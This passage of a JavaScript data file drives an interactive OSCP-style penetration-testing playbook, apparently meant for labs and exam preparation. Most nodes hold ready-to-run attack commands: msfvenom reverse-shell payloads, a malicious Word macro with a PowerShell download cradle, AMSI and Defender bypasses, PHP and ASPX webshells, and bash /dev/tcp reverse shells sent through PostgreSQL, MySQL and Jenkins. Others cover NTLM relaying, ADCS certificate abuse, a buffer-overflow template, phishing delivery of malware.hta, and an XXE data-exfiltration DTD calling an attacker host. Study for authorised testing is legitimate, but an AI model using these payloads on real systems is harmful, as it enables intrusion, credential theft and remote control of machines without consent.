# [ ] nmap output showing open ports + versions
# [ ] exploit execution (command + connection callback)
# [ ] whoami + hostname + ip + local.txt (single frame)
# [ ] privesc vector identified (command shown)
# [ ] whoami (root/SYSTEM) + hostname + ip + proof.txt`,
    warn: "Never say 'it is impossible to X' — you had limited time and budget. Say 'OffSec was unable to X during the engagement.' Don't oversell or undersell severity — the client's mental model of their risk should be accurate when they finish reading. Remediation must be specific — 'apply patches' fails. 'Update Apache to 2.4.54 on host 192.168.1.10' passes.",
    choices: [
      { label: "Back to tactic index", next: "reporting" },
      { label: "Final submission checklist", next: "doc_submit" },
    ],
  },

  rdp: {
    phase: "WINDOWS",
    title: "RDP (3389)",
    body: "RDP is everywhere on Windows targets. xfreerdp from Kali, pass-the-hash via restricted admin mode, credential spray. Always try creds you already have.",
    cmd: `xfreerdp /u:user /p:'password' /v:$ip /cert-ignore
xfreerdp /u:administrator /pth:NTLM_HASH /v:$ip /cert-ignore +clipboard

crackmapexec rdp $ip -u users.txt -p passwords.txt
crackmapexec rdp $ip -u administrator -H NTLM_HASH

nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $ip

# BlueKeep check (CVE-2019-0708) — DO NOT auto-exploit, can crash target
nmap -p 3389 --script rdp-vuln-ms12-020 $ip`,
    warn: "Pass-the-hash via RDP requires restricted admin mode to be enabled on the target.",
    choices: [
      { label: "Got RDP access — Windows foothold", next: "windows_post_exploit" },
      { label: "Need creds first", next: "bruteforce" },
      { label: "BlueKeep vulnerable — searchsploit", next: "searchsploit_web" },
    ],
  },

  responder: {
    phase: "AD",
    title: "Responder / LLMNR Poisoning",
    body: "Poison LLMNR/NBT-NS broadcasts to capture NTLMv2 hashes. Run early — let it collect in background while you enumerate. Relay if cracking fails.",
    cmd: `sudo responder -I eth0 -wdF

# Captured hashes appear in /usr/share/responder/logs/
cat /usr/share/responder/logs/*.txt

# Crack NTLMv2 (module 5600)
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.txt rockyou.txt -r best64.rule

# If cracking fails — relay instead (turn off SMB/HTTP in Responder.conf first)
sudo responder -I eth0 -wdF --lm
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell`,
    warn: "Disable SMB and HTTP in /etc/responder/Responder.conf before running ntlmrelayx — both cannot listen on the same port.",
    choices: [
      { label: "Captured and cracked hash", next: "creds_found" },
      { label: "Relayed hash — got shell", next: "windows_post_exploit" },
      { label: "No hashes captured — try other AD vectors", next: "ad_start" },
    ],
  },

  adcs: {
    phase: "AD",
    title: "AD Certificate Services (ESC1/ESC4)",
    body: "Misconfigured certificate templates let low-priv users enroll as Domain Admin. ESC1 is the most common — find it with Certipy.",
    cmd: `certipy find -u user@domain.com -p 'pass' -dc-ip $ip -vulnerable -stdout

# ESC1 — enroll as DA using vulnerable template
certipy req -u user@domain.com -p 'pass' \\
  -ca 'CA-NAME' -template 'VulnTemplate' \\
  -upn administrator@domain.com -dc-ip $ip

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip $ip
# Outputs NTLM hash for administrator

# ESC4 — write owner on template, modify to ESC1, exploit
certipy template -u user@domain.com -p 'pass' \\
  -template 'VulnTemplate' -save-old -dc-ip $ip

# Pass-the-hash with retrieved administrator hash
evil-winrm -i $ip -u administrator -H <NTLM_HASH>`,
    warn: "Always -save-old when modifying templates in ESC4 — restore after exploitation or you'll break the environment.",
    choices: [
      { label: "Got DA cert — authenticated as admin", next: "dcsync" },
      { label: "No vulnerable templates found", next: "ad_manual" },
    ],
  },

  dpapi: {
    phase: "WINDOWS",
    title: "DPAPI Credential Extraction",
    body: "DPAPI protects browser passwords, credential manager, and WiFi keys. Accessible as the user who encrypted them or as SYSTEM with the domain backup key.",
    cmd: `# Chrome saved passwords (as the user)
mimikatz "dpapi::chrome /in:%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data /unprotect" exit

# Credential Manager blobs
cmdkey /list
mimikatz "vault::cred /patch" exit
mimikatz "dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\<blob>" exit

# Find all DPAPI blobs
dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>$null
dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>$null

# Master keys needed to decrypt
dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\* 2>$null

# From Kali with domain backup key (DA required)
impacket-dpapi backupkeys --export -t domain/admin:'pass'@$ip`,
    warn: null,
    choices: [
      { label: "Found plaintext creds", next: "creds_found" },
      { label: "Got domain backup key — decrypt all blobs", next: "got_root_windows" },
    ],
  },

  bof: {
    phase: "SHELL",
    title: "Buffer Overflow (Windows x86)",
    body: "Stack-based BOF: fixed buffer on stack, input larger than buffer overwrites adjacent memory including the return address. When the function ends, ret pops return address into EIP — control that value, control execution. Flow: (1) large buffer triggers overflow, (2) padding fills to exact offset, (3) return address overwritten with JMP ESP gadget, (4) JMP ESP redirects to ESP which points into shellcode on the stack. ASLR/DEP are out of scope for PEN-200 BOF exercises.",
    cmd: `# ── GEF — modern GDB for Linux BOF (Kali 2026.1) ────
# Install: pip3 install gef --break-system-packages
# Or: bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
gdb -q ./vulnerable_binary
# In GDB with GEF:
gef➤  pattern create 200    # generate cyclic pattern
gef➤  run                   # crash it
gef➤  pattern offset $eip   # find offset automatically
gef➤  checksec              # ASLR/NX/PIE/stack canary check
gef➤  info functions        # list all functions
gef➤  disas main            # disassemble
gef➤  x/32wx $esp           # examine stack

# Immunity Debugger (Windows BOF) — still the standard on OSCP
# !mona findmsp             # find EIP offset
# !mona jmp -r esp          # find JMP ESP

# -- FUZZ — find crash length -----------------
python3 -c "print(\'A\' * 2000)" | nc $ip <PORT>
# Increment by 100 until crash

# -- FIND EXACT OFFSET ------------------------
msf-pattern_create -l 2000 > pattern.txt
# Send pattern, note EIP value in Immunity Debugger
msf-pattern_offset -l 2000 -q <EIP_VALUE>

# -- CONFIRM EIP CONTROL ----------------------
# Send: padding + BBBB + CCCC... — confirm EIP = 42424242

# -- BAD CHARS --------------------------------
# Send \x01-\xFF after EIP, compare memory dump
# Common: \x00 (null), \x0a (LF), \x0d (CR)

# -- FIND JMP ESP GADGET ----------------------
# In Immunity Debugger:
!mona jmp -r esp -cpb "\x00"
# Or with nasm: jmp esp = opcode FFE4

# MUST be from a NON-ASLR module inside the vulnerable app
# View → Executable Modules → confirm no ASLR / SafeSEH
# Never use ntdll/kernel32 — randomized at every boot
# If exploit DLL absent on target (e.g. msvbvm60.dll):
#   check Python version of same exploit for verified addr
#   or copy DLLs to Kali and search:
objdump -D target.dll | grep -i "jmp.*esp"

# -- GENERATE SHELLCODE -----------------------
msfvenom -p windows/shell_reverse_tcp \
  LHOST=$lhost LPORT=$lport EXITFUNC=thread \
  -f py -e x86/shikata_ga_nai \
  -b "\x00\x0a\x0d"    # all bad chars here

# -- FINAL EXPLOIT STRUCTURE ------------------
offset   = EXACT_OFFSET
padding  = b"A" * offset
eip      = b"\xAA\xBB\xCC\xDD"  # JMP ESP addr — little endian (replace with actual)
nop_sled = b"\x90" * 16             # NOP slide before shellcode
buf      = b"PASTE_MSFVENOM_BUF"
payload  = padding + eip + nop_sled + buf`,
    warn: "JMP ESP must come from non-ASLR module in the vulnerable app — never ntdll/kernel32 (randomized at boot). NOP sled (\x90 * 16) gives shikata decoder room. EXITFUNC=thread keeps service alive. Rotated EIP (expected 0x10090c83, got 0x9010090c) = off-by-one null byte — C null-terminates strings so memset(buf+size-1, 0x00) shrinks buffer by 1. Fix: increase buffer size by 1.",
    choices: [
      { label: "Exploit worked — got shell", next: "shell_upgrade" },
      { label: "Need to fix a public C exploit", next: "exploit_fix_c" },
      { label: "Shell died — try EXITFUNC=thread", next: "bof" },
    ],
  },
  client_side: {
    phase: "SHELL",
    title: "Client-Side Attacks",
    body: "HTA, malicious Office macros, VBA. Used when you have a way to get a user to open a file or click a link. Set up listener first.",
    cmd: `# HTA via msfvenom
msfvenom -p windows/shell_reverse_tcp \\
  LHOST=$lhost LPORT=$lport -f hta-psh -o shell.hta
python3 -m http.server 80
# Deliver: http://$lhost/shell.hta

# VBA macro (Word/Excel)
# Insert > Module in VBA editor:
Sub AutoOpen()
  Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
End Sub

# PowerShell download cradle
IEX(New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')

# Generate PS reverse shell
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$lhost LPORT=$lport -f ps1 > shell.ps1

nc -nlvp $lport`,
    warn: "Macro execution requires the user to enable macros. Social engineering text in the doc helps.",
    choices: [
      { label: "User executed — got shell", next: "shell_upgrade" },
      { label: "AV killed the payload", next: "amsi_bypass" },
    ],
  },

  amsi_bypass: {
    phase: "WINDOWS",
    title: "AMSI / AV Bypass",
    body: "AMSI blocks PowerShell payloads in memory. Patch it first, then load tools. Obfuscation handles signature-based AV.",
    cmd: `# AMSI patch (run in PS session first)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or: base64 encoded AMSI bypass
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Obfuscated download cradle (evades string detection)
$c = New-Object Net.WebClient
$c.DownloadString('http://$lhost/tool.ps1') | IEX

# Invoke-Obfuscation (offline tool)
Invoke-Obfuscation -ScriptPath shell.ps1 -Command TOKEN\\ALL\\1

# Simple string concat to evade sig detection
$cmd = 'Inv'+'oke-Mi'+'mikatz'

# Defender exclusion (if admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"`,
    warn: "AMSI patches are session-scoped — must run in every new PS session before loading tools.",
    choices: [
      { label: "AMSI bypassed — load tools", next: "windows_post_exploit" },
      { label: "Still blocked — try different bypass", next: "amsi_bypass" },
    ],
  },

  iis_aspx: {
    phase: "WEB",
    title: "IIS / ASPX Webshell",
    body: "IIS runs ASPX not PHP. If you can upload or write to the webroot, drop an ASPX shell. Default IIS path is C:\\inetpub\\wwwroot.",
    cmd: `# Generate ASPX shell
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$lhost LPORT=$lport -f aspx -o shell.aspx

# Simple ASPX webshell (upload and browse to it)
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(Process.Start(new ProcessStartInfo("cmd.exe",
   "/c " + Request["cmd"]) { RedirectStandardOutput=true,
   UseShellExecute=false }).StandardOutput.ReadToEnd()); %>

# Access: http://$ip/shell.aspx?cmd=whoami

# IIS specific paths
C:\\inetpub\\wwwroot\\
C:\\inetpub\\wwwroot\\aspnet_client\\

# Check IIS version and config
type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config
type C:\\inetpub\\wwwroot\\web.config`,
    warn: "IIS app pool runs as IIS_IUSRS by default — low priv. Check SeImpersonatePrivilege for potato escalation.",
    choices: [
      { label: "Webshell uploaded — got RCE", next: "reverse_shell" },
      { label: "Got shell — check token privs", next: "token_privs" },
      { label: "Upload blocked", next: "web_fuzz_deep" },
    ],
  },

  postgres: {
    phase: "RECON",
    title: "PostgreSQL (5432)",
    body: "PostgreSQL with COPY TO/FROM PROGRAM is RCE. Default postgres user often has no password. pg_hba.conf controls who can connect.",
    cmd: `psql -h $ip -U postgres
psql -h $ip -U postgres -p 5432

# Default creds: postgres:(blank)  postgres:postgres  postgres:password

# Once connected — RCE via COPY
psql> COPY shell FROM PROGRAM 'id';
psql> COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1"';

# Read files
psql> COPY shell FROM '/etc/passwd';
psql> SELECT * FROM shell;

# Write files (if superuser)
psql> COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';

# Enumerate
psql> \\l           # list databases
psql> \\c dbname    # connect to db
psql> \\dt          # list tables
psql> SELECT current_user, pg_postmaster_start_time();`,
    warn: null,
    choices: [
      { label: "RCE via COPY PROGRAM — got shell", next: "shell_upgrade" },
      { label: "Wrote webshell — got RCE", next: "reverse_shell" },
      { label: "Found creds in DB", next: "creds_found" },
    ],
  },

  mongodb: {
    phase: "RECON",
    title: "MongoDB (27017)",
    body: "Unauthenticated MongoDB exposes all databases. No auth by default in older versions. Dump everything — creds are often stored in plaintext.",
    cmd: `mongosh $ip
mongosh mongodb://$ip:27017

# If auth required
mongosh mongodb://admin:password@$ip:27017

# Enumerate and dump
> show dbs
> use <dbname>
> show collections
> db.<collection>.find()
> db.<collection>.find().pretty()

# Dump all
mongoexport --host $ip --db <db> --collection <col> --out dump.json
mongodump --host $ip --out ./mongodump/

# Look for users, passwords, tokens, API keys
> db.users.find()
> db.accounts.find()

# Check for credentials in all collections
> db.getCollectionNames().forEach(c => { print(c); db[c].findOne(); })`,
    warn: null,
    choices: [
      { label: "Found credentials", next: "creds_found" },
      { label: "Found app data — check for web vectors", next: "web_enum" },
    ],
  },

  jenkins: {
    phase: "WEB",
    title: "Jenkins (8080/8443)",
    body: "CI/CD server = code execution by design. Script console is RCE if you can reach it. Check anonymous access first — many dev instances skip auth entirely.",
    cmd: `nmap -p 8080,8443 -sV $ip
curl -s http://$ip:8080/api/json | jq .
curl -s http://$ip:8080/script          # admin-only but worth trying
curl -s http://$ip:8080/asynchPeople/   # user list (sometimes open)

# Default creds: admin:admin  admin:jenkins  jenkins:jenkins
# Brute force login
hydra -l admin -P rockyou.txt $ip http-post-form \\
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"

# Script console RCE (Groovy) — once authenticated
# http://$ip:8080/script
def cmd = "id"
def proc = cmd.execute()
proc.waitForOrKill(1000)
println proc.text

# Reverse shell via script console
String host="$lhost"; int port=$lport; String cmd2="/bin/bash"
Process p=new ProcessBuilder(cmd2).redirectErrorStream(true).start()
Socket s=new Socket(host,port)
[p.inputStream,s.inputStream].each { it.eachByte { s.outputStream.write(it) } }

# Dump stored credentials (script console)
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
creds.each { println it.id + ":" + it.username + ":" + it.password }

# CVE-2024-23897 — arbitrary file read (Jenkins < 2.441)
java -jar jenkins-cli.jar -s http://$ip:8080/ help "@/etc/passwd"`,
    warn: "Script console RCE runs as the Jenkins service user — often jenkins or root. Check for SSH keys and AWS creds in credential store.",
    choices: [
      { label: "Anonymous script console — got RCE", next: "reverse_shell" },
      { label: "Authenticated — dumped stored creds", next: "creds_found" },
      { label: "CVE-2024-23897 file read — found creds", next: "creds_found" },
      { label: "Need creds — brute force login", next: "bruteforce" },
    ],
  },

  vnc: {
    phase: "RECON",
    title: "VNC (5900-5906)",
    body: "VNC = graphical desktop access. No-auth instances are instant wins. Brute force is fast. Decrypt stored VNC passwords from config files if you find them.",
    cmd: `nmap -p 5900-5906 -sV --script vnc-info,vnc-brute $ip

# Check for no-auth (Security Type 1 = None)
vncviewer $ip:5900   # try without password first

# Common VNC passwords
# password  12345678  vnc123  admin  (blank)

# Brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://$ip
medusa -h $ip -u "" -P passwords.txt -M vnc

# If you have file access — decrypt stored VNC password
# Location: ~/.vnc/passwd  C:\\Users\\user\\.vnc\\passwd
python3 -c "
import subprocess
with open('.vnc/passwd','rb') as f: data=f.read()
key=[23,82,107,6,35,78,88,7]
from itertools import islice
import struct
def decrypt(data,key):
    result=[]
    for i,b in enumerate(data[:8]):
        k=key[i%8]
        result.append(b^k)
    return bytes(result)
print(decrypt(data,key))
"

# Once connected — get shell via VNC
# Open terminal in VNC session then use standard shells`,
    warn: null,
    choices: [
      { label: "No auth — instant desktop access", next: "shell_upgrade" },
      { label: "Cracked password — got desktop access", next: "shell_upgrade" },
      { label: "Found passwd file — decrypted VNC creds", next: "creds_found" },
    ],
  },

  webdav: {
    phase: "WEB",
    title: "WebDAV",
    body: "WebDAV over HTTP/HTTPS lets you upload files via PUT. If PUT is enabled and you can write to the webroot, you have a shell. Test methods first.",
    cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods $ip
curl -X OPTIONS http://$ip/webdav/ -v   # Look for PUT in Allow header

davtest -url http://$ip/webdav/
davtest -url http://$ip/webdav/ -auth user:pass

# Direct PUT upload
curl -X PUT http://$ip/webdav/shell.php \\
  -u user:pass \\
  -d '<?php system($_GET["cmd"]); ?>'

# Upload as .txt then MOVE to .php (extension bypass)
curl -X PUT http://$ip/webdav/shell.txt -u user:pass \\
  -d '<?php system($_GET["cmd"]); ?>'
curl -X MOVE http://$ip/webdav/shell.txt \\
  -u user:pass -H "Destination: http://$ip/webdav/shell.php"

# ASPX for IIS
curl -X PUT http://$ip/webdav/shell.aspx -u user:pass \\
  --data-binary @shell.aspx

# Common paths
# /webdav/  /dav/  /WebDAV/  /uploads/  /_vti_bin/

# List contents
cadaver http://$ip/webdav/
# dav> ls  put shell.php  get file.txt`,
    warn: "Check if the upload directory is web-accessible — WebDAV root may not be under webroot.",
    choices: [
      { label: "PUT enabled — uploaded shell", next: "reverse_shell" },
      { label: "MOVE bypass worked — got RCE", next: "reverse_shell" },
      { label: "Need creds — try default WebDAV creds", next: "bruteforce" },
    ],
  },

  nfs_enum: {
    phase: "RECON",
    title: "NFS (2049)",
    body: "NFS shares expose the filesystem. no_root_squash = instant root. Mount the share, check UIDs, look for SSH keys and credentials.",
    cmd: `nmap -p 2049,111 --script nfs-ls,nfs-showmount,nfs-statfs $ip
showmount -e $ip
rpcinfo -p $ip | grep nfs

# Mount the share
mkdir /mnt/nfs
mount -t nfs $ip:/share /mnt/nfs -o nolock
ls -la /mnt/nfs

# Find interesting files
find /mnt/nfs -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
find /mnt/nfs -name "*password*" -o -name ".env" 2>/dev/null
grep -r "password\\|secret\\|key" /mnt/nfs 2>/dev/null

# Check file ownership UIDs
ls -lan /mnt/nfs   # numeric UIDs — match them locally

# no_root_squash exploit — run as root on Kali
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# On target: /path/to/rootbash -p

# UID manipulation — match file owner
useradd -u 1000 fakeuser && su fakeuser

# Write SSH key if home dir is exported
mkdir -p /mnt/nfs/root/.ssh
cp ~/.ssh/id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys
chmod 600 /mnt/nfs/root/.ssh/authorized_keys
ssh root@$ip`,
    warn: "Always check if no_root_squash is set — showmount output shows (everyone) vs (ro,root_squash).",
    choices: [
      { label: "no_root_squash — SUID bash = root", next: "got_root_linux" },
      { label: "Wrote SSH key — shell as root", next: "got_root_linux" },
      { label: "Found credentials in share", next: "creds_found" },
      { label: "Found SSH key", next: "ssh_key" },
    ],
  },

  mysql: {
    phase: "RECON",
    title: "MySQL (3306)",
    body: "MySQL with FILE privilege = read/write OS files. INTO OUTFILE drops a webshell. UDF gives full RCE. Root with no password is common on dev boxes.",
    cmd: `nmap -p 3306 -sV --script mysql-info,mysql-empty-password $ip
mysql -u root -h $ip           # no password
mysql -u root -h $ip -p        # try: root, password, mysql, toor

# Default creds: root:(blank)  root:root  root:password

# Enumerate once connected
SHOW DATABASES; USE <db>; SHOW TABLES;
SELECT user,host,authentication_string FROM mysql.user;
SHOW VARIABLES LIKE 'secure_file_priv';  # empty = no restriction
SHOW VARIABLES LIKE 'plugin_dir';

# Read files (needs FILE priv)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# Write webshell (needs FILE priv + webroot write)
SELECT '<?php system($_GET["cmd"]); ?>'
  INTO OUTFILE '/var/www/html/shell.php';

# UDF RCE (MySQL running as root)
# searchsploit mysql udf — compile raptor_udf2.c
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';
SELECT do_system('bash -i >& /dev/tcp/$lhost/$lport 0>&1');

# Brute force
hydra -l root -P rockyou.txt $ip mysql`,
    warn: "secure_file_priv restricts INTO OUTFILE. If set to a specific path, you can only write there.",
    choices: [
      { label: "INTO OUTFILE webshell — got RCE", next: "reverse_shell" },
      { label: "UDF RCE worked — got shell", next: "shell_upgrade" },
      { label: "Dumped creds from DB", next: "creds_found" },
      { label: "Read sensitive config file", next: "creds_found" },
    ],
  },

  rsync: {
    phase: "RECON",
    title: "Rsync (873)",
    body: "Rsync modules are directory shares. Anonymous read = file loot. Anonymous write = upload SSH keys or webshells. Enumerate modules first.",
    cmd: `nmap -p 873 -sV --script rsync-list-modules $ip
nc -nv $ip 873     # banner grab

# List modules (anonymous)
rsync rsync://$ip/
rsync rsync://$ip/<module>/

# Download entire module
rsync -av rsync://$ip/<module>/ /tmp/rsync_loot/

# With credentials
rsync -av rsync://user:pass@$ip/<module>/ /tmp/loot/

# Search for useful files
find /tmp/rsync_loot -name "id_rsa" -o -name "*.key" -o -name ".env"
find /tmp/rsync_loot -name "*.conf" | xargs grep -i "pass\\|secret"

# Upload SSH key (if writable)
rsync ~/.ssh/id_rsa.pub rsync://$ip/<module>/.ssh/authorized_keys

# Upload webshell (if module under webroot)
rsync shell.php rsync://$ip/<module>/shell.php`,
    warn: "Module names are case-sensitive. Try common names: backup, data, files, web, www, home, root.",
    choices: [
      { label: "Anonymous read — found credentials", next: "creds_found" },
      { label: "Found SSH key in module", next: "ssh_key" },
      { label: "Wrote SSH key — got shell", next: "got_root_linux" },
      { label: "Wrote webshell", next: "reverse_shell" },
    ],
  },

  smtp_enum: {
    phase: "RECON",
    title: "SMTP (25/465/587)",
    body: "SMTP leaks usernames via VRFY/EXPN/RCPT. Valid users feed your spray lists. Open relay lets you send phishing emails internally.",
    cmd: `nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $ip

# Banner grab
nc $ip 25
telnet $ip 25

# VRFY — user enumeration (most common)
telnet $ip 25
EHLO test
VRFY root
VRFY admin
VRFY www-data

# EXPN — expand mailing lists
EXPN admins
EXPN all

# RCPT TO — enumerate valid users
MAIL FROM:<test@test.com>
RCPT TO:<admin@$domain>   # 250=exists  550=not found

# Automated user enum
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
smtp-user-enum -M RCPT -U users.txt -t $ip -f sender@test.com

# Open relay test
telnet $ip 25
EHLO test
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>   # 250 = open relay

# Send phishing if open relay (client-side attacks)
swaks --to victim@$domain --from "it@$domain" \\
  --server $ip --attach malware.hta`,
    warn: "VRFY and EXPN are often disabled on hardened servers. RCPT TO is less likely to be blocked.",
    choices: [
      { label: "Enumerated valid users — spray them", next: "ad_spray" },
      { label: "Open relay — send phishing for client-side", next: "client_side" },
      { label: "Found NTLM info — extract domain info", next: "ad_start" },
    ],
  },

  elasticsearch: {
    phase: "RECON",
    title: "Elasticsearch (9200/9300)",
    body: "Elasticsearch REST API is unauthenticated by default in older versions. All data is JSON and browsable. Dump everything — it often holds app credentials and PII.",
    cmd: `nmap -p 9200,9300 -sV $ip
curl -s http://$ip:9200/          # cluster info + version
curl -s http://$ip:9200/_cat/indices?v  # list all indices
curl -s http://$ip:9200/_cat/nodes?v    # node info

# Browse indices
curl -s http://$ip:9200/<index>/_search?pretty
curl -s http://$ip:9200/<index>/_search?q=password&pretty
curl -s "http://$ip:9200/_all/_search?q=password&pretty&size=100"

# Dump all data
curl -s http://$ip:9200/<index>/_search?size=10000 | jq .

# Cluster settings
curl -s http://$ip:9200/_cluster/settings
curl -s http://$ip:9200/_nodes

# Search for credentials
curl -s "http://$ip:9200/_all/_search?q=password+OR+passwd+OR+secret&pretty"

# Write to index (if writable — can inject data)
curl -X POST http://$ip:9200/test/_doc/1 \\
  -H "Content-Type: application/json" \\
  -d '{"cmd":"id"}'

# Check for Kibana on 5601
curl -s http://$ip:5601/api/status`,
    warn: "Elasticsearch 8.x has security enabled by default. Older versions (6.x, 7.x) are often unauthenticated.",
    choices: [
      { label: "Found credentials in indices", next: "creds_found" },
      { label: "Kibana accessible on 5601", next: "web_enum" },
      { label: "Nothing useful — check other ports", next: "unknown_service" },
    ],
  },

  docker_api: {
    phase: "RECON",
    title: "Docker API (2375/2376)",
    body: "Exposed Docker API = instant root on the host. Mount the host filesystem into a privileged container. No password needed on port 2375.",
    cmd: `nmap -p 2375,2376 -sV $ip
curl -s http://$ip:2375/containers/json   # if returns data = unauthenticated
curl -s http://$ip:2375/version

# List containers and images
export DOCKER_HOST="tcp://$ip:2375"
docker ps -a
docker images

# Instant root — mount host filesystem
docker -H tcp://$ip:2375 run -it --rm \\
  --privileged -v /:/mnt alpine chroot /mnt sh

# Read /etc/shadow
docker -H tcp://$ip:2375 run --rm \\
  -v /etc:/mnt/etc alpine cat /mnt/etc/shadow

# Write SSH key to host root
docker -H tcp://$ip:2375 run --rm \\
  -v /root/.ssh:/mnt/.ssh alpine sh -c \\
  "echo 'ssh-rsa YOURKEY' >> /mnt/.ssh/authorized_keys"

# Container escape if already inside container
# Check if privileged: cat /proc/self/status | grep CapEff
# Check for docker socket: ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh`,
    warn: "Port 2375 = unauthenticated. Port 2376 = TLS. If docker.sock is mounted inside a container you're already in, you can escape to host.",
    choices: [
      { label: "Mounted host FS — got root on host", next: "got_root_linux" },
      { label: "Inside container with docker.sock", next: "got_root_linux" },
      { label: "Found creds in container env vars", next: "creds_found" },
    ],
  },

  winrm_access: {
    phase: "WINDOWS",
    title: "WinRM (5985/5986)",
    body: "WinRM is evil-winrm's playground. If you have creds or an NTLM hash for a user in the Remote Management Users group, you have a shell.",
    cmd: `nmap -p 5985,5986 -sV $ip
curl -s http://$ip:5985/wsman   # 200 = WinRM accessible

# evil-winrm — primary tool
evil-winrm -i $ip -u administrator -p 'password'
evil-winrm -i $ip -u 'DOMAIN\\user' -p 'password'
evil-winrm -i $ip -u administrator -H <NTLM_HASH>
evil-winrm -i $ip -u administrator -p 'password' -S  # SSL/5986

# Upload/download files in evil-winrm session
upload /path/to/tool.exe C:\\Windows\\Temp\\tool.exe
download C:\\Users\\admin\\Desktop\\proof.txt

# crackmapexec to test creds
crackmapexec winrm $ip -u user -p 'password'
crackmapexec winrm $ip -u users.txt -p passwords.txt
crackmapexec winrm $ip -u user -H <HASH>

# PowerShell remoting (from Windows)
$sess = New-PSSession -ComputerName $ip -Credential (Get-Credential)
Enter-PSSession $sess`,
    warn: "User must be in 'Remote Management Users' or 'Administrators' group. WinRM is usually enabled on domain-joined machines.",
    choices: [
      { label: "Got WinRM shell — start privesc", next: "windows_post_exploit" },
      { label: "Need creds first", next: "bruteforce" },
      { label: "Have hash — Pass the Hash", next: "pth" },
    ],
  },

  xxe: {
    phase: "WEB",
    title: "XXE — XML External Entity",
    body: "XXE = make the server read local files or trigger internal HTTP requests via XML. Find any endpoint that accepts XML (SOAP, REST with XML body, file upload of SVG/DOCX/XML). Blind XXE needs out-of-band — use Burp Collaborator or interactsh.",
    cmd: `# Detect XML endpoints
# Look for: Content-Type: application/xml, text/xml, application/soap+xml
# File uploads: .xml, .svg, .docx, .xlsx (all use XML internally)
# API bodies containing XML

# Basic file read (direct output)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

# Windows file read
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root><data>&xxe;</data></root>

# PHP wrapper — base64 encode to bypass filters
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
# Decode: echo "BASE64" | base64 -d

# SSRF via XXE — probe internal network
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root><data>&xxe;</data></root>

# Blind XXE — out-of-band DNS detection
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR.burpcollaborator.net/xxe">
  %xxe;
]>
<root/>

# Blind XXE with data exfil (evil.dtd on your server)
# evil.dtd content:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://ATTACKER/?d=%file;'>">
# %wrap; %send;
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://$lhost/evil.dtd">
  %dtd;
]>
<root/>

# SVG upload XXE
<svg xmlns="http://www.w3.org/2000/svg">
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <text>&xxe;</text>
</svg>

# Quick file targets
# Linux: /etc/passwd /etc/shadow /proc/self/environ /var/www/html/config.php
# Windows: C:\\Windows\\win.ini C:\\inetpub\\wwwroot\\web.config`,
    warn: "If output is empty but no error, assume blind XXE — switch to out-of-band. PHP filter wrapper works even when direct SYSTEM entity is blocked.",
    choices: [
      { label: "Got file read — found creds in config", next: "creds_found" },
      { label: "SSRF — pivoting to internal services", next: "ssrf" },
